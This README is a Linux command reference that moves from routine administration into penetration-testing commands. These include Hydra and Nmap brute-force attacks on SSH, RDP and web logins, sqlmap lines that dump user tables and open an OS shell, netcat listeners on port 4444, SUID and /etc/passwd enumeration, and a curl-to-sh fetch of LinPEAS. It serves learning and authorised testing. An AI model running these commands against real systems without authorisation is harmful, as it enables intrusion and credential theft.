# Linux-commands-reference-

A comprehensive reference table for common Linux system commands.

## File System Commands

| Command | Description | Common Options | Examples |
|---------|-------------|----------------|----------|
| `ls` | List directory contents | `-l` (long), `-a` (all), `-h` (human) | `ls -la /home` |
| `cd` | Change directory | | `cd /var/log` |
| `pwd` | Print working directory | | `pwd` |
| `cp` | Copy files/directories | `-r` (recursive), `-v` (verbose) | `cp -r dir1 dir2` |
| `mv` | Move/rename files | | `mv old.txt new.txt` |
| `rm` | Remove files | `-r` (recursive), `-f` (force) | `rm -rf directory/` |

## System Information

| Command | Description | Common Options | Examples |
|---------|-------------|----------------|----------|
| `uname` | System information | `-a` (all), `-r` (kernel) | `uname -a` |
| `df` | Disk space usage | `-h` (human) | `df -h` |
| `free` | Memory usage | `-h` (human) | `free -h` |
| `top` | Process monitoring | | `top` |
| `ps` | Process status | `aux`, `-ef` | `ps aux` |

## System Monitoring & Performance

| Command | Description | Examples |
|---------|-------------|----------|
| `htop` | Interactive process viewer | `htop` |
| `iotop` | Monitor disk I/O usage | `iotop -o` |
| `nethogs` | Monitor network usage by process | `nethogs eth0` |
| `vmstat` | Virtual memory statistics | `vmstat 1 10` |
| `iostat` | CPU and I/O statistics | `iostat -dx 2` |
| `lsof` | List open files | `lsof -i :80`, `lsof +D /var/log` |
| `strace` | Trace system calls | `strace -p <PID>` |
| `ss` | Socket statistics | `ss -tuln`, `ss -s` |

## File Operations

| Command | Description | Common Options | Examples |
|---------|-------------|----------------|----------|
| `cat` | Concatenate files | `-n` (number) | `cat file.txt` |
| `grep` | Search text | `-r` (recursive), `-i` (ignore case) | `grep "error" log.txt` |
| `find` | Find files | `-name`, `-type` | `find / -name "*.conf"` |
| `chmod` | Change permissions | | `chmod 755 script.sh` |
| `chown` | Change ownership | `-R` (recursive) | `chown user:group file` |

## Network Commands

| Command | Description | Common Options | Examples |
|---------|-------------|----------------|----------|
| `ping` | Test connectivity | `-c` (count) | `ping -c 4 google.com` |
| `ifconfig` | Network interface config | | `ifconfig eth0` |
| `netstat` | Network statistics | `-tulpn` | `netstat -tulpn` |
| `ssh` | Secure shell | `-p` (port) | `ssh user@host` |
| `scp` | Secure copy | `-r` (recursive) | `scp file.txt user@host:/path` |

## Package Management

| Distribution | Command | Description |
|--------------|---------|-------------|
| Ubuntu/Debian | `apt-get` | Package management |
| CentOS/RHEL | `yum` | Package management |
| Arch | `pacman` | Package management |

## User & Permission Management

| Command | Description | Examples |
|---------|-------------|----------|
| `adduser` | Add new user | `adduser john` |
| `usermod` | Modify user account | `usermod -aG sudo john` |
| `passwd` | Change password | `passwd john` |
| `chage` | Change password expiry | `chage -l john` |
| `visudo` | Edit sudoers file safely | `visudo` |
| `getent` | Get user info | `getent passwd john` |
| `id` | Show user identity | `id john` |
| `groups` | Show user groups | `groups john` |

## Service Management

| Command | Description | Examples |
|---------|-------------|----------|
| `systemctl` | Systemd service control | `systemctl status apache2`, `systemctl restart ssh` |
| `journalctl` | Systemd logs | `journalctl -u nginx -f`, `journalctl --since "1 hour ago"` |
| `service` | SysV init service control | `service ssh restart` |

## Nmap - Network Scanning

| Command | Description | Examples |
|---------|-------------|----------|
| Basic scan | TCP SYN scan | `nmap -sS 192.168.1.0/24` |
| Version detection | Service version detection | `nmap -sV 192.168.1.1` |
| OS detection | Operating system detection | `nmap -O 192.168.1.1` |
| Script scanning | NSE script scanning | `nmap -sC 192.168.1.1` |
| Aggressive scan | All main techniques | `nmap -A 192.168.1.1` |
| UDP scan | UDP port scanning | `nmap -sU 192.168.1.1` |
| Port range | Specific port range | `nmap -p 1-1000 192.168.1.1` |
| Output formats | Save results | `nmap -oN scan.txt 192.168.1.1` |
| Stealth scan | Slow, stealthy scan | `nmap -T1 192.168.1.1` |

### Common Nmap Scripts:
- `nmap --script vuln 192.168.1.1` - Vulnerability scanning
- `nmap --script http-enum 192.168.1.1` - HTTP enumeration
- `nmap --script ssh-brute 192.168.1.1` - SSH brute force
- `nmap --script smb-brute 192.168.1.1` - SMB brute force

## Hydra - Password Brute Force

| Command | Description | Examples |
|---------|-------------|----------|
| SSH brute force | Attack SSH service | `hydra -l username -P passlist.txt ssh://192.168.1.1` |
| FTP brute force | Attack FTP service | `hydra -L userlist.txt -P passlist.txt ftp://192.168.1.1` |
| HTTP POST form | Attack web forms | `hydra -l admin -P passlist.txt 192.168.1.1 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"` |
| RDP attack | Attack Remote Desktop | `hydra -L users.txt -P passes.txt rdp://192.168.1.1` |
| Custom port | Specify custom port | `hydra -l admin -P passlist.txt 192.168.1.1 http-get -s 8080` |
| Service detection | Automatic service detection | `hydra -L users.txt -P passes.txt -M targets.txt` |

### Common Hydra Options:
- `-t` - Number of parallel tasks (default: 16)
- `-f` - Exit after first found password
- `-v` - Verbose mode
- `-V` - Show login+pass combination
- `-e` - Additional checks (n=null, s=login-as-pass, r=reverse-login)

## Web Application Testing

### SQL Injection
```bash
# SQLmap examples
sqlmap -u "http://site.com/page.php?id=1" --dbs
sqlmap -u "http://site.com/page.php?id=1" -D database --tables
sqlmap -u "http://site.com/page.php?id=1" -D database -T users --dump
sqlmap -u "http://site.com/page.php?id=1" --os-shell

# Gobuster examples
gobuster dir -u http://site.com -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://site.com -w wordlist.txt -x php,html,txt
gobuster dns -d domain.com -w subdomains.txt

#Dirb examples
dirb http://site.com /usr/share/dirb/wordlists/common.txt
dirb http://site.com -X .php,.html

# Sublist3r
sublist3r -d domain.com

# Amass
amass enum -d domain.com
amass enum -brute -d domain.com -w wordlist.txt

## Network Analysis Tools

| Command | Description | Examples |
|---------|-------------|----------|
| `tcpdump` | Network packet analyzer | `tcpdump -i eth0`, `tcpdump port 80` |
| `wireshark` | GUI packet analyzer | `wireshark` |
| `tshark` | CLI packet analyzer | `tshark -i eth0 -f "tcp port 80"` |
| `netcat` | Network Swiss army knife | `nc -lvnp 4444`, `nc 192.168.1.1 80` |
| `socat` | Multipurpose relay | `socat TCP-LISTEN:4444 STDOUT` |
| `curl` | HTTP client | `curl -X POST http://site.com -d "data"` |
| `wget` | File downloader | `wget http://site.com/file` |

## Privilege Escalation Commands

### System Information
```bash
# Kernel version
uname -a
cat /etc/*-release

# Running processes
ps aux
ps -ef

# Scheduled tasks
crontab -l
ls -la /etc/cron*

# SUID files
find / -perm -4000 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Network information
ifconfig
netstat -tulpn
ss -tulpn

# Users and groups
cat /etc/passwd
cat /etc/group
id

# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Linux Exploit Suggester
./linux-exploit-suggester.sh

# Linux Smart Enumeration
./lse.sh -l1
